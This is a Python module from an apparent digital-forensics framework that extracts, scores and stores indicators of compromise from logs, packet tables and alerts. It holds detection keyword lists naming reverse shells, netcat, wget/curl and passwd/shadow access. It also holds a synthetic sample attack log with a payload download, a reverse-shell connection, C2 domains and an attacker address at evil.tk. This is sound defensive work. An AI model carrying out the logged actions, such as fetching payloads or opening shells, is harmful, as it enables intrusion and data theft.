"""
Phase 8: IOC Extraction Module
DFIR Correlation Framework
"""

import re
import sqlite3
import json
import os
from datetime import datetime
from pathlib import Path

BASE_DIR = Path(__file__).parent.parent
DB_PATH  = BASE_DIR / "database" / "dfir.db"

PATTERNS = {
    "ip": re.compile(
        r"\b(?!10\.\d+\.\d+\.\d+|192\.168\.\d+\.\d+|172\.(?:1[6-9]|2\d|3[01])\.\d+\.\d+|127\.\d+\.\d+\.\d+)"
        r"(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\b"
    ),
    "private_ip": re.compile(
        r"\b(?:10\.\d+\.\d+\.\d+|192\.168\.\d+\.\d+|172\.(?:1[6-9]|2\d|3[01])\.\d+\.\d+|127\.\d+\.\d+\.\d+)\b"
    ),
    "domain": re.compile(
        r"\b(?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+"
        r"(?:com|net|org|edu|gov|io|co|uk|de|ru|cn|info|biz|xyz|top|tk|ml|ga|cf|gq|onion)\b",
        re.IGNORECASE
    ),
    "url": re.compile(r"https?://[^\s\"'<>]+", re.IGNORECASE),
    "md5":    re.compile(r"\b[a-fA-F0-9]{32}\b"),
    "sha1":   re.compile(r"\b[a-fA-F0-9]{40}\b"),
    "sha256": re.compile(r"\b[a-fA-F0-9]{64}\b"),
    "email":  re.compile(r"\b[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}\b"),
    "cve":    re.compile(r"\bCVE-\d{4}-\d{4,7}\b", re.IGNORECASE),
    "user_agent": re.compile(
        r"(?:curl|wget|python-requests|masscan|nmap|nikto|sqlmap|hydra|metasploit)[^\s\"']*",
        re.IGNORECASE
    ),
}

SUSPICIOUS_TLDS     = {".tk", ".ml", ".ga", ".cf", ".gq", ".onion", ".xyz", ".top"}
SUSPICIOUS_KEYWORDS = [
    "payload", "shell", "exploit", "hack", "malware", "trojan", "backdoor",
    "c2", "reverse", "meterpreter", "cobalt", "beacon", "rat", "keylog",
    "exfil", "dump", "passwd", "shadow", "wget", "curl", "base64",
    "powershell", "cmd.exe", "bash", "nc ",
]


def get_connection():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn


def init_ioc_table():
    conn = get_connection()
    c = conn.cursor()
    c.execute("""
        CREATE TABLE IF NOT EXISTS iocs (
            id            INTEGER PRIMARY KEY AUTOINCREMENT,
            ioc_type      TEXT NOT NULL,
            ioc_value     TEXT NOT NULL,
            source        TEXT,
            source_line   TEXT,
            confidence    TEXT DEFAULT 'MEDIUM',
            tags          TEXT,
            first_seen    TEXT,
            last_seen     TEXT,
            count         INTEGER DEFAULT 1,
            enriched      INTEGER DEFAULT 0,
            UNIQUE(ioc_type, ioc_value)
        )
    """)
    conn.commit()
    conn.close()
    print("[+] IOC table ready.")


def _should_skip(ioc_type, value):
    if ioc_type == "ip":
        if value.startswith(("0.", "255.", "224.", "239.")):
            return True
    if ioc_type == "domain":
        if len(value) < 6:
            return True
        if "localhost" in value or "localdomain" in value:
            return True
    if ioc_type in ("md5", "sha1", "sha256"):
        if value == value[0] * len(value):
            return True
    return False


def _calculate_confidence(ioc_type, value, context):
    context_lower = context.lower()
    if any(kw in context_lower for kw in SUSPICIOUS_KEYWORDS):
        return "HIGH"
    if ioc_type == "domain":
        tld = "." + value.rsplit(".", 1)[-1].lower()
        if tld in SUSPICIOUS_TLDS:
            return "HIGH"
    if ioc_type in ("user_agent", "cve"):
        return "HIGH"
    if ioc_type == "url" and any(kw in value.lower() for kw in SUSPICIOUS_KEYWORDS):
        return "HIGH"
    if ioc_type == "ip" and value.startswith("8.8."):
        return "LOW"
    return "MEDIUM"


def _tag_ioc(ioc_type, value, context):
    tags = [ioc_type]
    ctx  = context.lower()
    if "failed" in ctx or "invalid" in ctx:
        tags.append("failed-auth")
    if "ssh" in ctx:
        tags.append("ssh")
    if "http" in ctx or "GET" in context or "POST" in context:
        tags.append("web")
    if "scan" in ctx or "nmap" in ctx:
        tags.append("scan")
    if "brute" in ctx or "password" in ctx:
        tags.append("brute-force")
    if any(kw in ctx for kw in ["malware", "trojan", "virus", "ransom"]):
        tags.append("malware")
    if "exfil" in ctx or "upload" in ctx:
        tags.append("exfiltration")
    if ioc_type == "domain":
        tld = "." + value.rsplit(".", 1)[-1].lower()
        if tld in SUSPICIOUS_TLDS:
            tags.append("suspicious-tld")
    if ioc_type == "user_agent":
        tags.append("attack-tool")
    return list(set(tags))


def extract_iocs_from_text(text, source="unknown"):
    found = []
    for line in text.splitlines():
        line = line.strip()
        if not line:
            continue
        for ioc_type, pattern in PATTERNS.items():
            for match in pattern.finditer(line):
                value = match.group(0)
                if _should_skip(ioc_type, value):
                    continue
                confidence = _calculate_confidence(ioc_type, value, line)
                tags       = _tag_ioc(ioc_type, value, line)
                found.append({
                    "ioc_type":   ioc_type,
                    "ioc_value":  value,
                    "source":     source,
                    "source_line": line[:300],
                    "confidence": confidence,
                    "tags":       json.dumps(tags),
                    "timestamp":  datetime.now().isoformat(),
                })
    return found


def store_iocs(iocs):
    if not iocs:
        return 0
    conn      = get_connection()
    c         = conn.cursor()
    new_count = 0
    now       = datetime.now().isoformat()
    for ioc in iocs:
        c.execute("""
            INSERT INTO iocs
                (ioc_type, ioc_value, source, source_line,
                 confidence, tags, first_seen, last_seen, count)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, 1)
            ON CONFLICT(ioc_type, ioc_value) DO UPDATE SET
                last_seen  = excluded.last_seen,
                count      = count + 1,
                confidence = CASE
                    WHEN excluded.confidence = 'HIGH' THEN 'HIGH'
                    ELSE confidence
                END
        """, (
            ioc["ioc_type"], ioc["ioc_value"], ioc["source"],
            ioc["source_line"], ioc["confidence"], ioc["tags"],
            ioc["timestamp"], now,
        ))
        if c.lastrowid and c.rowcount == 1:
            new_count += 1
    conn.commit()
    conn.close()
    return new_count


def extract_from_log_files():
    evidence_dir = BASE_DIR / "evidence" / "logs"
    if not evidence_dir.exists():
        print(f"[!] No evidence/logs directory found: {evidence_dir}")
        return 0
    total = 0
    for log_file in evidence_dir.rglob("*"):
        if log_file.is_file() and log_file.suffix in (".log", ".txt", ".csv", ""):
            try:
                text   = log_file.read_text(errors="ignore")
                iocs   = extract_iocs_from_text(text, source=log_file.name)
                stored = store_iocs(iocs)
                total += stored
                print(f"  [+] {log_file.name}: {len(iocs)} extracted, {stored} new")
            except Exception as e:
                print(f"  [!] Error reading {log_file}: {e}")
    return total


def extract_from_db_logs():
    conn = get_connection()
    c    = conn.cursor()
    c.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='log_events'")
    if not c.fetchone():
        print("[!] log_events table not found — skipping.")
        conn.close()
        return 0
    c.execute("SELECT raw_line, source_file FROM log_events")
    rows = c.fetchall()
    conn.close()
    all_iocs = []
    for row in rows:
        iocs = extract_iocs_from_text(row["raw_line"] or "", source=row["source_file"] or "db")
        all_iocs.extend(iocs)
    stored = store_iocs(all_iocs)
    print(f"  [+] log_events DB: {len(all_iocs)} extracted, {stored} new")
    return stored


def extract_from_network_events():
    conn = get_connection()
    c    = conn.cursor()
    c.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='network_packets'")
    if not c.fetchone():
        print("[!] network_packets table not found — skipping.")
        conn.close()
        return 0
    c.execute("SELECT src_ip, dst_ip, protocol, info, payload_preview FROM network_packets")
    rows = c.fetchall()
    conn.close()
    all_iocs = []
    for row in rows:
        text = " ".join(filter(None, [
            row["src_ip"], row["dst_ip"], row["protocol"],
            row["info"], row["payload_preview"]
        ]))
        iocs = extract_iocs_from_text(text, source="network_packets")
        all_iocs.extend(iocs)
    stored = store_iocs(all_iocs)
    print(f"  [+] network_packets: {len(all_iocs)} extracted, {stored} new")
    return stored


def extract_from_alerts():
    conn = get_connection()
    c    = conn.cursor()
    c.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='alerts'")
    if not c.fetchone():
        print("[!] alerts table not found — skipping.")
        conn.close()
        return 0
    c.execute("SELECT description, source_ip, details FROM alerts")
    rows = c.fetchall()
    conn.close()
    all_iocs = []
    for row in rows:
        text = " ".join(filter(None, [row["description"], row["source_ip"], row["details"]]))
        iocs = extract_iocs_from_text(text, source="alerts")
        all_iocs.extend(iocs)
    stored = store_iocs(all_iocs)
    print(f"  [+] alerts: {len(all_iocs)} extracted, {stored} new")
    return stored


SAMPLE_LOG = """
2024-01-15 02:14:33 Failed password for root from 185.220.101.47 port 49823 ssh2
2024-01-15 02:14:35 Failed password for admin from 185.220.101.47 port 49824 ssh2
2024-01-15 02:14:37 Failed password for root from 45.33.32.156 port 12345 ssh2
2024-01-15 02:16:10 GET /wp-login.php HTTP/1.1 200 - 91.108.4.23 "sqlmap/1.6.0"
2024-01-15 02:17:00 POST /shell.php HTTP/1.1 200 - 91.108.4.23 "curl/7.68.0"
2024-01-15 02:18:45 DNS query for malware-c2.xyz from 192.168.1.100
2024-01-15 02:19:00 Outbound connection to 194.165.16.20:4444 reverse shell suspected
2024-01-15 02:20:10 File hash detected: 5f4dcc3b5aa765d61d8327deb882cf99
2024-01-15 02:21:00 CVE-2021-44228 exploit attempt from 45.155.205.233
2024-01-15 02:22:30 User-Agent: Masscan/1.3 from 89.248.172.16
2024-01-15 02:23:15 wget http://192.168.1.200/payload.sh executed on host
2024-01-15 02:24:00 Email received from attacker@evil.tk with attachment
2024-01-15 02:26:00 Connection to known C2: update-service.ml:8080
2024-01-15 02:27:00 Nmap scan detected from 203.0.113.42
2024-01-15 02:29:00 Outbound DNS to 185.220.101.47 for exfil-data.onion
"""


def inject_sample_data():
    evidence_dir = BASE_DIR / "evidence" / "logs"
    evidence_dir.mkdir(parents=True, exist_ok=True)
    sample_file = evidence_dir / "sample_attack.log"
    sample_file.write_text(SAMPLE_LOG)
    print(f"[+] Sample log written: {sample_file}")

    conn = get_connection()
    c    = conn.cursor()
    c.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='log_events'")
    if c.fetchone():
        for line in SAMPLE_LOG.strip().splitlines():
            line = line.strip()
            if line:
                c.execute("""
                    INSERT OR IGNORE INTO log_events
                        (timestamp, event_type, raw_line, source_file)
                    VALUES (?, 'SAMPLE', ?, 'sample_attack.log')
                """, (datetime.now().isoformat(), line))
        conn.commit()
        print("[+] Sample rows inserted into log_events.")
    conn.close()


def get_ioc_summary():
    conn = get_connection()
    c    = conn.cursor()
    c.execute("""
        SELECT ioc_type, confidence, COUNT(*) as cnt
        FROM iocs GROUP BY ioc_type, confidence ORDER BY cnt DESC
    """)
    rows = c.fetchall()
    conn.close()
    summary = {}
    for row in rows:
        key = row["ioc_type"]
        if key not in summary:
            summary[key] = {"HIGH": 0, "MEDIUM": 0, "LOW": 0, "total": 0}
        summary[key][row["confidence"]] = row["cnt"]
        summary[key]["total"] += row["cnt"]
    return summary


def get_all_iocs(ioc_type=None, confidence=None, limit=200):
    conn   = get_connection()
    c      = conn.cursor()
    query  = "SELECT * FROM iocs WHERE 1=1"
    params = []
    if ioc_type:
        query += " AND ioc_type = ?"
        params.append(ioc_type)
    if confidence:
        query += " AND confidence = ?"
        params.append(confidence)
    query += " ORDER BY count DESC, last_seen DESC LIMIT ?"
    params.append(limit)
    c.execute(query, params)
    rows = [dict(r) for r in c.fetchall()]
    conn.close()
    return rows


def print_ioc_report():
    print("\n" + "="*60)
    print("  IOC EXTRACTION REPORT")
    print("="*60)
    summary = get_ioc_summary()
    if not summary:
        print("  No IOCs found.")
        return
    print(f"\n{'TYPE':<15} {'TOTAL':>6} {'HIGH':>6} {'MEDIUM':>8} {'LOW':>5}")
    print("-"*44)
    for ioc_type, counts in sorted(summary.items(), key=lambda x: -x[1]["total"]):
        print(f"  {ioc_type:<13} {counts['total']:>6} {counts['HIGH']:>6} "
              f"{counts['MEDIUM']:>8} {counts['LOW']:>5}")
    print("\n── TOP HIGH-CONFIDENCE IOCs ──")
    for ioc in get_all_iocs(confidence="HIGH", limit=20):
        tags = json.loads(ioc.get("tags") or "[]")
        print(f"  [{ioc['ioc_type'].upper():<10}] {ioc['ioc_value']:<42} "
              f"cnt={ioc['count']:>3}  {tags}")
    print("\n── ALL IPs ──")
    for ioc in get_all_iocs(ioc_type="ip", limit=20):
        print(f"  {ioc['ioc_value']:<22} conf={ioc['confidence']:<8} cnt={ioc['count']}")
    print("\n── DOMAINS ──")
    for ioc in get_all_iocs(ioc_type="domain", limit=20):
        print(f"  {ioc['ioc_value']:<40} conf={ioc['confidence']:<8} cnt={ioc['count']}")
    print("="*60)


def run_ioc_extraction(use_sample=False):
    print("\n" + "="*60)
    print("  PHASE 8: IOC EXTRACTION")
    print("="*60)
    init_ioc_table()
    if use_sample:
        print("\n[*] Injecting sample data...")
        inject_sample_data()
    print("\n[*] Extracting IOCs from all sources...")
    total  = 0
    total += extract_from_log_files()
    total += extract_from_db_logs()
    total += extract_from_network_events()
    total += extract_from_alerts()
    print(f"\n[✓] Total new IOCs stored: {total}")
    print_ioc_report()
    return total


if __name__ == "__main__":
    import sys
    use_sample = "--sample" in sys.argv or "-s" in sys.argv
    run_ioc_extraction(use_sample=use_sample)
